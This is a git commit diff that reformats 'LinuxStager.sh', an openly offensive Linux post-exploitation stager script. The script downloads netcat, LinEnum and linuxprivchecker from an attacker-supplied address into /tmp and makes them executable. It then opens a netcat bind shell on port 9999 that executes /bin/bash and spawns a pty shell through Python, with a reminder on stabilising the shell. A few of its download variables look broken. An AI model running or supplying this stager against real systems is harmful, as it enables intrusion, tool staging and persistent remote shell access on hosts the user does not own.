b7dac88d8cf0988118af9837c4d46e5fc488c96a
WillChaos <46702070+WillChaos@users.noreply.github.com>
2019-03-02 19:13:57 +0800

    Update LinuxStager.sh

--- PrivEsc/LinuxStager.sh
+++ PrivEsc/LinuxStager.sh
@@ -17,45 +17,48 @@ if [ -z "$1" ]
     echo "NOTE: make sure you include the trailing: / " 
   else
 
-# banner
-echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
-echo "[]_________________________________________________________________________________________[]"
-
-# download NC
-echo "[*] Downloading NC to: /tmp/ + making executable"
-wget $1nc -O /tmp/nc && chmod +x /tmp/nc
-
-
-# download linenum.sh
-echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-wget $LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
+  # banner
+  echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
+  echo "[]_________________________________________________________________________________________[]"
+  echo " Tagreting file source: $1"
+  echo "[]_________________________________________________________________________________________[]"
+  sleep 2s
+  
+  # download NC
+  echo "[*] Downloading NC to: /tmp/ + making executable"
+  wget $1nc -O /tmp/nc && chmod +x /tmp/nc
 
 
-# download LinxPrivChecker.py
-echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
-wget $linuxprivchecker.py -O /tmp/LPC.py
+  # download linenum.sh
+  echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
+  wget $LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
 
-# build a NC bind shell incase we lose a shell
-echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
-/tmp/nc -nlvp 9999 -e /bin/bash &
-# chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
-sleep 2s
 
-# semi interactive shell
-echo "[*] Attempting to build semi-interactive shell "
-if command -v python &>/dev/null; then
-    echo "-[*] Python availble, dropping semi-tty shell"
-    python -c 'import pty;pty.spawn("/bin/bash");'
-    
-elif command -v python3 &>/dev/null; then
-    echo "-[*] Python 3 availble, dropping semi-tty shell"
-    python3 -c 'import pty;pty.spawn("/bin/bash");' 
-    
-else
-    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method"
-fi
+  # download LinxPrivChecker.py
+  echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
+  wget $linuxprivchecker.py -O /tmp/LPC.py
 
-echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
+  # build a NC bind shell incase we lose a shell
+  echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
+  /tmp/nc -nlvp 9999 -e /bin/bash &
+  # chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
+  sleep 2s
+
+  # semi interactive shell
+  echo "[*] Attempting to build semi-interactive shell "
+  if command -v python &>/dev/null; then
+      echo "-[*] Python availble, dropping semi-tty shell"
+      python -c 'import pty;pty.spawn("/bin/bash");'
+
+  elif command -v python3 &>/dev/null; then
+      echo "-[*] Python 3 availble, dropping semi-tty shell"
+      python3 -c 'import pty;pty.spawn("/bin/bash");' 
+
+  else
+      echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method"
+  fi
+
+  echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
 
 fi
 
